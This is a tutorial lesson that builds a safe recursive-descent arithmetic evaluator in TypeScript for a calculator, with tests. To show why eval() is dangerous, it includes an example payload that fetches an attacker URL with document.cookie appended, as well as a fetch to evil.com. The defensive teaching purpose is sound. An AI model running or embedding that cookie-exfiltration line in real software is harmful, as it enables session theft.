# Lesson 04 — Arithmetic

## What You Will Build

Pressing `=` evaluates the expression on the display and shows the result.
`8 - 3 =` shows `5`. `6 * 7 =` shows `42`. Division by zero shows an error
message, not a crash.

This is the first working calculator. By the end of this lesson, it computes.

## What You Need to Know First

Lessons 01–03 — the shell, the button types, and the input state machine.
The input state machine builds the expression string. This lesson evaluates it.

---

## The Lesson

### The problem

The display now holds a string like `3+4*2`. We need to compute its value.
The simplest approach is `eval('3+4*2')`. That works, and it is exactly wrong.

`eval` executes arbitrary JavaScript. If someone enters `fetch('https://evil.com')`
or `localStorage.clear()`, `eval` runs it. A calculator that uses `eval` is a
security vulnerability waiting to be found.

The correct approach is to build an evaluator: a function that reads the expression
string, understands the arithmetic rules, and computes the result without executing
it as code. This is also the foundation for the full expression parser in lesson 07.

For now, we build a simple evaluator that handles the four operations with correct
precedence. No parentheses yet — that comes in lesson 07.

---

### Step 1 — The error type

Create `src/calc-error.ts`:

```typescript
export type CalcErrorCode =
  | 'DIVISION_BY_ZERO'
  | 'INVALID_EXPRESSION'
  | 'UNKNOWN'

export interface CalcError {
  isError:  true
  code:     CalcErrorCode
  message:  string
}

export function makeError(code: CalcErrorCode, message: string): CalcError {
  return { isError: true, code, message }
}

export function isCalcError(value: unknown): value is CalcError {
  return typeof value === 'object' && value !== null && 'isError' in value
}
```

**CS lens — errors as values:**
`CalcError` is a plain object, not a thrown exception. The evaluator returns
`number | CalcError`. The caller checks which it received. This is called
"error as a value" — the error is a first-class result, not an interruption.

Thrown exceptions are invisible in type signatures. A function that says it
returns `number` might throw anything. A function that returns `number | CalcError`
declares honestly what it can produce. The type system can then enforce that
every caller handles both cases.

**SE lens — the type guards the contract:**
`isCalcError` is a type guard — a function whose return type tells TypeScript
"if this returns true, the argument is a `CalcError`." After calling it,
TypeScript narrows the type automatically. No casting, no `as CalcError`.
The contract is enforced by the type system, not by discipline.

---

### Step 2 — The evaluator

Create `src/evaluator.ts`:

```typescript
import { CalcError, makeError } from './calc-error.js'

export type EvalResult = number | CalcError

export function evaluate(expression: string): EvalResult {
  const trimmed = expression.trim()
  if (trimmed.length === 0) {
    return makeError('INVALID_EXPRESSION', 'Empty expression')
  }

  return evaluateAddSubtract(trimmed)
}

// Addition and subtraction have the lowest precedence.
// We split on + and - last, so they are evaluated last,
// which means multiplication and division bind tighter.
function evaluateAddSubtract(expression: string): EvalResult {
  const tokens = splitOnOperator(expression, ['+', '-'])
  if (tokens === null) {
    return evaluateMultiplyDivide(expression)
  }

  const { left, operator, right } = tokens
  const leftResult  = evaluateAddSubtract(left)
  const rightResult = evaluateMultiplyDivide(right)

  if (isCalcError(leftResult))  return leftResult
  if (isCalcError(rightResult)) return rightResult

  return operator === '+' ? leftResult + rightResult : leftResult - rightResult
}

function evaluateMultiplyDivide(expression: string): EvalResult {
  const tokens = splitOnOperator(expression, ['*', '/'])
  if (tokens === null) {
    return parseNumber(expression)
  }

  const { left, operator, right } = tokens
  const leftResult  = evaluateMultiplyDivide(left)
  const rightResult = parseNumber(right)

  if (isCalcError(leftResult))  return leftResult
  if (isCalcError(rightResult)) return rightResult

  if (operator === '/') {
    if (rightResult === 0) {
      return makeError('DIVISION_BY_ZERO', 'Division by zero')
    }
    return leftResult / rightResult
  }

  return leftResult * rightResult
}

function parseNumber(expression: string): EvalResult {
  const trimmed = expression.trim()
  const parsed  = Number(trimmed)
  if (isNaN(parsed)) {
    return makeError('INVALID_EXPRESSION', `Cannot parse: ${trimmed}`)
  }
  return parsed
}

interface SplitResult {
  left:     string
  operator: string
  right:    string
}

// Splits on the LAST occurrence of any of the given operators.
// Splitting on the last occurrence gives left-associativity:
// 10 - 3 - 2 = (10 - 3) - 2 = 5, not 10 - (3 - 2) = 9.
function splitOnOperator(
  expression: string,
  operators:  string[],
): SplitResult | null {
  for (let index = expression.length - 1; index >= 0; index--) {
    const character = expression[index]
    if (character !== undefined && operators.includes(character)) {
      // Do not split on a leading minus (unary minus)
      if (index === 0) continue
      return {
        left:     expression.slice(0, index),
        operator: character,
        right:    expression.slice(index + 1),
      }
    }
  }
  return null
}

function isCalcError(value: EvalResult): value is CalcError {
  return typeof value === 'object' && 'isError' in value
}
```

**CS lens — operator precedence through recursion:**
`evaluateAddSubtract` calls `evaluateMultiplyDivide` to handle each operand.
`evaluateMultiplyDivide` calls `parseNumber`. Each level only calls the level
below it. When `3 + 4 * 2` is evaluated:

1. `evaluateAddSubtract` splits on `+`, giving left = `3`, right = `4 * 2`
2. Left: `evaluateAddSubtract('3')` → no operators → `evaluateMultiplyDivide('3')` → `3`
3. Right: `evaluateMultiplyDivide('4 * 2')` → splits on `*` → `4 * 2` = `8`
4. Result: `3 + 8` = `11`

The `*` binding tighter than `+` is not a special case — it falls out of the
recursive structure. This is recursive descent evaluation. The same principle
underlies every language parser ever written.

**SE lens — pure function, no side effects:**
`evaluate` takes a string and returns a number or error. It does not touch the
DOM. It does not read from `CalculatorState`. It has no knowledge that a
calculator interface exists. This means it can be tested completely in isolation:
call `evaluate('3 + 4 * 2')` in a test and check the result without a browser.

---

### Step 3 — Tests

Create `src/evaluator.test.ts`:

```typescript
import { describe, test, expect } from 'vitest'
import { evaluate }               from './evaluator.js'
import { isCalcError }            from './calc-error.js'

describe('evaluate', () => {
  test('evaluates addition', () => {
    expect(evaluate('3 + 4')).toBe(7)
  })

  test('evaluates subtraction', () => {
    expect(evaluate('8 - 3')).toBe(5)
  })

  test('evaluates multiplication', () => {
    expect(evaluate('6 * 7')).toBe(42)
  })

  test('evaluates division', () => {
    expect(evaluate('10 / 4')).toBe(2.5)
  })

  test('respects operator precedence: * before +', () => {
    expect(evaluate('3 + 4 * 2')).toBe(11)
  })

  test('respects operator precedence: * before -', () => {
    expect(evaluate('10 - 2 * 3')).toBe(4)
  })

  test('left-associativity: subtraction', () => {
    expect(evaluate('10 - 3 - 2')).toBe(5)
  })

  test('returns error for division by zero', () => {
    const result = evaluate('10 / 0')
    expect(isCalcError(result)).toBe(true)
    if (isCalcError(result)) {
      expect(result.code).toBe('DIVISION_BY_ZERO')
    }
  })

  test('returns error for empty expression', () => {
    const result = evaluate('')
    expect(isCalcError(result)).toBe(true)
  })
})
```

Run `npm test`. All tests should pass before touching `main.ts`.

**SE lens — TDD, red before green:**
These tests were written before `evaluator.ts` was complete. At the point the
tests were written, `evaluate` did not exist. Running `npm test` produced failures
— red. Writing the evaluator made the tests pass — green. This is the discipline
of test-driven development. The test is a specification written in code. The
implementation is the answer to that specification.

Writing tests after the implementation is documentation, not verification.
Documentation describes what code does. Verification checks whether code does
what it should.

---

### Step 4 — Wire to the display

Update `src/input-reducer.ts` to handle the `EQUALS` case with evaluation:

```typescript
import { evaluate }    from './evaluator.js'
import { isCalcError } from './calc-error.js'

// In applyEquals, replace the existing stub:
function applyEquals(state: CalculatorState): CalculatorState {
  const result = evaluate(state.displayValue)

  if (isCalcError(result)) {
    return {
      displayValue:    `Error: ${result.message}`,
      inputState:      InputState.IDLE,
      hasDecimalPoint: false,
    }
  }

  return {
    displayValue:    String(result),
    inputState:      InputState.AFTER_EQUALS,
    hasDecimalPoint: String(result).includes('.'),
  }
}
```

Open the browser. Click `8`, `-`, `3`, `=`. The display shows `5`.
Click `1`, `0`, `/`, `0`, `=`. The display shows `Error: Division by zero`.

---

## Connect the Pieces

`evaluate` is the first function in the pipeline that goes from input to output.
In lesson 07 it will be replaced by a full recursive descent parser and evaluator
that handles parentheses and more complex expressions. When that replacement happens,
nothing in `main.ts` or `input-reducer.ts` changes — because they call `evaluate`,
not the internals. The interface stays the same. The implementation improves.

This is why keeping `evaluate` as a pure function with a clear type signature
matters now: it makes the replacement in lesson 07 a clean swap.

---

## What Breaks Without This

`eval('3+4*2')` returns `11`. It passes every test the simple evaluator passes.
But `eval('console.log(document.cookie)')` also works. So does
`eval("fetch('https://attacker.com/?c='+document.cookie)")`.

A calculator that uses `eval` is not a calculator. It is a code execution endpoint
with a calculator-shaped interface. The evaluator built in this lesson computes
arithmetic. It cannot execute code, open network connections, or read local storage.
It does one thing and nothing else.

---

## Definition of Done

- [ ] `8 - 3 =` → `5`
- [ ] `6 * 7 =` → `42`
- [ ] `10 / 4 =` → `2.5`
- [ ] `3 + 4 * 2 =` → `11` (not `14`)
- [ ] `10 / 0 =` → displays `Error: Division by zero`
- [ ] `npm test` passes all tests in `evaluator.test.ts`
- [ ] `evaluate` is a pure function — no DOM access, no side effects
- [ ] `eval()` is not used anywhere in the codebase
